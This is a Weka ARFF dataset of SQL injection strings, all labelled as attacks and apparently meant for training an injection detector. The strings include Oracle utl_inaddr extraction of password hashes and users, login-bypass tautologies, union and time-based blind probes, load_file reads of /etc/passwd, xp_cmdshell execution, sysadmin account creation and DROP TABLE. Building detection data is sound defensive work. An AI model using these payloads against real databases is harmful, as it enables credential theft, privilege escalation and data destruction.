@relation Test-weka.filters.unsupervised.attribute.NominalToString-C1-weka.filters.unsupervised.attribute.NumericToNominal-R2

@attribute sentence string
@attribute type {0,1}

@data
'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT COUNT ( DISTINCT ( GRANTED_ROLE  )  )   FROM DBA_ROLE_PRIVS WHERE GRANTEE = SYS.LOGIN_USER  )  )   AND \'i\' = \'i',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 1  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 1  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 1  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 1  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 1  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 2  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 2  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 2  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 2  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 2  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 3  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 3  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 3  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 3  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 3  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 4  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 4  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 4  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 4  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 4  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 5  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 5  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 5  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 5  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 5  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 6  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 6  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 6  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 6  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 7  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 7  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 7  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 7  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 7  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( USERNAME )  FROM  ( SELECT DISTINCT ( USERNAME ) , ROWNUM AS LIMIT FROM SYS.ALL_USERS )  WHERE LIMIT = 8  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( PASSWORD )  FROM  ( SELECT DISTINCT ( PASSWORD ) , ROWNUM AS LIMIT FROM SYS.USER$ )  WHERE LIMIT = 8  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( table_name )  FROM  ( SELECT DISTINCT ( table_name ) , ROWNUM AS LIMIT FROM sys.all_tables )  WHERE LIMIT = 8  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( column_name )  FROM  ( SELECT DISTINCT ( column_name ) , ROWNUM AS LIMIT FROM all_tab_columns )  WHERE LIMIT = 8  )  )   AND \'i\' = \'i\'',1
'\'\' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 8  )  )   AND \'i\' = \'i\'',1
'\'\'|| ( elt ( -3+5,bin ( 15 ) ,ord ( 10 ) ,hex ( char ( 45  )  )    )  )  \'',1
||6,1
'\'||\'6',1
' ( ||6 ) ',1
'\' or 1 = 1-- ',1
'or 1 = 1',1
'\' or \'1\' = \'1',1
'; or \'1\' = \'1\'',1
'\'\'\' or isNULL ( 1/0 )  /*\'',1
'\' or \'7659\' = \'7659',1
'\'\'\' or isNULL ( 1/0 )  /*\'',1
'\' -- ',1
'\' or 1 = 1--',1
'\'\'\' or 1 = 1--\'',1
'\' or 1 = 1 /*',1
'or 1 = 1--',1
'\' or \'a\' = \'a',1
'\'\'\' or \'\'a\'\' = \'\'a\'',1
'\' )  or  ( \'a\' = \'a',1
'admin\' or \'',1
'\' select * from information_schema.tables--',1
' )  union select * from information_schema.tables;',1
'\' having 1 = 1--',1
'\' having 1 = 1--',1
'\' group by userid having 1 = 1--',1
'\' select name from syscolumns where id  =   ( select id from sysobjects where name  =  tablename\' ) --',1
'\' or 1 in  ( select @@version ) --',1
'\' union all select @@version--',1
'\' or \'unusual\'  =  \'unusual\'',1
'\' or \'something\'  =  \'some\'+\'thing\'',1
'\' or \'text\'  =  n\'text\'',1
'\' or \'something\' like \'some\%\'',1
'\' or 2 > 1',1
'\' or \'text\' > \'t\'',1
'\' or \'whatever\' in  ( \'whatever\' ) ',1
'\' or 2 between 1 and 3',1
'\' or username like char ( 37 ) ;',1
'\'\' union select * from users where login  =  char ( 114,111,111,116 ) ;\'',1
'\' union select ',1
'password:*/ = 1--',1
'uni/**/on sel/**/ect',1
'\'; execute immediate \'sel\' || \'ect us\' || \'er\'',1
'\'; exec  ( \'sel\' + \'ect us\' + \'er\' ) ',1
'\'/**/or/**/1/**/ = /**/1',1
'\' or 1/*',1
' or isNULL ( 1/0 )  /*',1
'\' or \'7659\' = \'7659',1
'\'\'\' or isNULL ( 1/0 )  /*\'',1
'\' -- &password = ',1
'\'; begin declare @var varchar ( 8000 )  set @var = \':\' select @var = @var+\'+login+\'/\'+password+\' \' from users where login > ',1
'@var select @var as var into temp end --',1
'\' and 1 in  ( select var from temp ) --',1
'\'\' union select 1,load_file ( \'/etc/passwd\' ) ,1,1,1;\'',1
'\'1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100  )  )   ) ,1,1,1;\'',1
'\'\' and 1 =  (  if  (  (  load_file ( char ( 110,46,101,120,116  )  )  <>char ( 39,39  )  )  ,1,0  )  )  ;\'',1
'\'; exec master..xp_cmdshell \'ping 10.10.1.2\'--',1
'create user name identified by \'pass123\'',1
'create user name identified by pass123 temporary tablespace temp default tablespace users; ',1
'\' ; drop table temp --',1
'\'exec sp_addlogin \'name\' , \'password\'\'',1
'\'exec sp_addsrvrolemember \'name\' , \'sysadmin\'\'',1
'\'insert into mysql.user  ( user, host, password )  values  ( \'name\', \'localhost\', password ( \'pass123\'  )  )  \'',1
'grant connect to name; grant resource to name;',1
'\'insert into users ( login, password, level )  values (  char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 )  + char ( 0x70 )  + char ( 0x65 )  + char ( 0x74 )  + char ( 0x65 )  + char ( 0x72 ) ,char ( 0x64 ) \'',1
'\' or 1 = 1 --',1
'\' union  ( select @@version )  --',1
'\'\' union  ( select NULL,  ( select @@version  )  )   --\'',1
'\'\' union  ( select NULL, NULL,  ( select @@version  )  )   --\'',1
'\'\' union  ( select NULL, NULL, NULL,   ( select @@version  )  )   --\'',1
'\'\' union  ( select NULL, NULL, NULL, NULL,   ( select @@version  )  )   --\'',1
'\'\' union  ( select NULL, NULL, NULL, NULL,  NULL,  ( select @@version  )  )   --\'',1
'\'\'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 0 )  waitfor delay \'0:0:2\' --\'',1
'\'\'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 5 )  waitfor delay \'0:0:2\' --\'',1
'\'\'; if not ( substring  (  (  select @@version ) ,25,1 )  <> 8 )  waitfor delay \'0:0:2\' --\'',1
'\'\'; if not ( substring  (  (  select @@version ) ,24,1 )  <> 1 )  waitfor delay \'0:0:2\' --\'',1
'\'; if not ( select system_user )  <> \'sa\' waitfor delay \'0:0:2\' --',1
'\'; if is_srvrolemember ( \'sysadmin\' )  > 0 waitfor delay \'0:0:2\' -- ',1
'\'; if not  (  (  select serverproperty ( \'isintegratedsecurityonly\'  )  )   <> 1 )  waitfor delay \'0:0:2\' --',1
'\'; if not  (  (  select serverproperty ( \'isintegratedsecurityonly\'  )  )   <> 0 )  waitfor delay \'0:0:2\' --',1
'\'& (  ) o1: select * from users where id = 1 or  (  )  = 1 union select 1,@@VERSION -- 1\'',1
'\'& ( . ) o: select * from users where id = 1 or  ( . )  = 1 union select 1,@@VERSION -- 1\'',1
'& ( 1&1: select * from users where id = 1 or  ( + )  = 1 or 1 = 1 -- 1',1
'\'& ( 1 ) o: select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1\'',1
'\'& ( 1UE: select * from users where id = 1 or  ( + )  = 1 union select 1,@@VERSION -- 1\'',1
'& ( n&1: select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1',1
'\'& ( nUE: select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1\'',1
'&.o&1: select * from users where id = 1 or .< or 1 = 1 -- 1',1
'&.o1&: select * from users where id = 1 or .<1 or 1 = 1 -- 1',1
'\'&.o1U: select * from users where id = 1 or .<1 union select 1,@@VERSION -- 1\'',1
'\'&.oUE: select * from users where id = 1 or .< union select 1,@@VERSION -- 1\'',1
'&.on&: select * from users where id = 1 or .<$ or 1 = 1 -- 1',1
'\'&.onU: select * from users where id = 1 or .<$ union select 1,@@VERSION -- 1\'',1
'\'&.oo1: select * from users where id = 1 or .<  = 1 union select 1,@@VERSION -- 1\'',1
'\'&1UE1: select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1\'',1
'\'&1UEv: select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1\'',1
'&1c: select * from users where id = 1   or 1 = 1 -- 1',1
'&1oo&: select * from users where id = 1 or +< or 1 = 1 -- 1',1
'\'&1oo1: select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1\'',1
'\'&1ooU: select * from users where id = 1 or +< union select 1,@@VERSION -- 1\'',1
'\'&1oon: select * from users where id = 1 or +<$ union select 1,@@VERSION -- 1\'',1
'\'&1ovc: select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1\'',1
'\'&n.o1: select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1\'',1
'&n1&1: select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1',1
'\'&n1UE: select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1\'',1
'&no&1: select * from users where id = 1 or $< or 1 = 1 -- 1',1
'&no.&: select * from users where id = 1 or $<. or 1 = 1 -- 1',1
'\'&no.U: select * from users where id = 1 or $<. union select 1,@@VERSION -- 1\'',1
'\'&noUE: select * from users where id = 1 or $< union select 1,@@VERSION -- 1\'',1
'&noo&: select * from users where id = 1 or $+< or 1 = 1 -- 1',1
'\'&noo1: select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1\'',1
'\'&nooU: select * from users where id = 1 or $+< union select 1,@@VERSION -- 1\'',1
'\'&noon: select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1\'',1
'&o.&1: select * from users where id = 1 or <. or 1 = 1 -- 1',1
'\'&o.UE: select * from users where id = 1 or <. union select 1,@@VERSION -- 1\'',1
'&o1&1: select * from users where id = 1 or <1 or 1 = 1 -- 1',1
'\'&o1UE: select * from users where id = 1 or <1 union select 1,@@VERSION -- 1\'',1
'\'&oUE1: select * from users where id = 1 or < union select 1,@@VERSION -- 1\'',1
'\'&oUEv: select * from users where id = 1 or < union select null,@@VERSION -- 1\'',1
'&on&1: select * from users where id = 1 or <$ or 1 = 1 -- 1',1
'\'&onUE: select * from users where id = 1 or <$ union select 1,@@VERSION -- 1\'',1
'&oo1&: select * from users where id = 1 or <  = 1 or 1 = 1 -- 1',1
'\'&oo1U: select * from users where id = 1 or <  = 1 union select 1,@@VERSION -- 1\'',1
'&ov&1: select * from users where id = 1 or !<@ or 1 = 1 -- 1',1
'\'&ovUE: select * from users where id = 1 or !<@ union select 1,version (  )  -- 1\'',1
'\'&v: select * from users where id = 1 or @`` union select 1,version (  )  -- 1\'',1
'\'&vc: select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1\'',1
'\'&voo1: select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1\'',1
' ) &1c: select * from users where id = 1 + (  )  or 1 = 1 -- 1',1
'\' ) UEvc: select * from users where id = 1 + (  )  union select null,@@VERSION -- 1\'',1
'\'.&1UE: select * from users where id = 1.&&1 union select 1,version (  )  -- 1\'',1
'.&1c: select * from users where id = 1. or 1 = 1 -- 1',1
'\'.&vUE: select * from users where id = 1.&&@ union select 1,version (  )  -- 1\'',1
'. ) &1c: select * from users where id = 1 +  ( . )  or 1 = 1 -- 1',1
'\'. ) UEv: select * from users where id = 1 +  ( . )  union select null,@@VERSION -- 1\'',1
'\'.UE1,: select * from users where id = 1.  union select 1,version (  )  -- 1\'',1
'\'.UE1k: select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1\'',1
'\'.UEf ( : select * from users where id = 1.  union select version (  ) ,version (  )  -- 1\'',1
'\'.UEv,: select * from users where id = 1. union select null,version (  )  -- 1\'',1
'\'.UEvc: select * from users where id = 1 +. union select null,@@VERSION -- 1\'',1
'\'.UEvk: select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1\'',1
'.o&1c: select * from users where id = 1. <@ or 1 = 1 -- 1',1
'.o.&1: select * from users where id = 1.<@. or 1 = 1 -- 1',1
'\'.o.UE: select * from users where id = 1.<@. union select 1,version (  )  -- 1\'',1
'.o1&1: select * from users where id = 1.*1 or 1 = 1 -- 1',1
'\'.o1UE: select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1\'',1
'\'.o1c: select * from users where id = 1.<1# union select 1,version (  )  -- 1\'',1
'\'.oUE1: select * from users where id = 1. <@ union select 1,version (  )  -- 1\'',1
'\'.oUEf: select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1\'',1
'\'.oUEv: select * from users where id = 1.* union select null,@@VERSION -- 1\'',1
'.on&1: select * from users where id = 1.<@$ or 1 = 1 -- 1',1
'\'.onUE: select * from users where id = 1.<@$ union select 1,version (  )  -- 1\'',1
'.ov&1: select * from users where id = 1.\%@ or 1 = 1 -- 1',1
'\'.ovUE: select * from users where id = 1.\%@ union select 1,version (  )  -- 1\'',1
'\'1&1UE: select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1\'',1
'1&1c: select * from users where id = 1 +1 or 1 = 1 -- 1',1
'1 ) &1c: select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1',1
'\'1 ) UE1: select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1\'',1
'\'1 ) UEv: select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1\'',1
'\'1UE1k: select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1\'',1
'\'1UEvk: select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1\'',1
'\'1c: select * from users where id = 11<1# union select 1,version (  )  -- 1\'',1
'1o ) &1: select * from users where id = 1 +  ( + )  or 1 = 1 -- 1',1
'\'1o ) UE: select * from users where id = 1 +  ( + )  union select null,@@VERSION -- 1\'',1
'\'1o.UE: select * from users where id = 1 ++. union select null,@@VERSION -- 1\'',1
'\'1oUE1: select * from users where id = 1 -1<@ union select 1,version (  )  -- 1\'',1
'\'1oUEf: select * from users where id = 1 +1<@ union select version (  ) ,version (  )  -- 1\'',1
'\'1oUEv: select * from users where id = 1 +1<@ union select null,version (  )  -- 1\'',1
'1oo&1: select * from users where id = 1 + +\% or 1 = 1 -- 1',1
'1oo1&: select * from users where id = 1 + +\%1 or 1 = 1 -- 1',1
'\'1oo1U: select * from users where id = 1 + +\%1 union select null,@@VERSION -- 1\'',1
'\'1ooUE: select * from users where id = 1 + +* union select null,@@VERSION -- 1\'',1
'1oon&: select * from users where id = 1 + +\%$ or 1 = 1 -- 1',1
'\'1oonU: select * from users where id = 1 + +*$ union select null,@@VERSION -- 1\'',1
'\'UE ( 1 ) : select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1\'',1
'\'UE1&1: select * from users where id = 1 union select 1||1,version (  )  -- 1\'',1
'\'UE1&v: select * from users where id = 1 union select 1||@,version (  )  -- 1\'',1
'\'UE111: select * from users where id = 1 union select 1 1$,version (  )  -- 1\'',1
'\'UE11f: select * from users where id = 1 union select 1 $,version (  )  -- 1\'',1
'\'UE11n: select * from users where id = 1 union select 1 1a,version (  )  -- 1\'',1
'\'UE1f ( : select * from users where id = 1 union select 1<@$,version (  )  -- 1\'',1
'\'UE1kn: select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1\'',1
'\'UE1n,: select * from users where id = 1 union select .1_,version (  )  -- 1\'',1
'\'UE1n: select * from users where id = 1 union select 1``,version (  )  -- 1\'',1
'\'UE1nc: select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1\'',1
'\'UE1nk: select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1\'',1
'\'UE1nn: select * from users where id = 1 union select .1$_,version (  )  -- 1\'',1
'\'UE1o,: select * from users where id = 1 union select 1<@,version (  )  -- 1\'',1
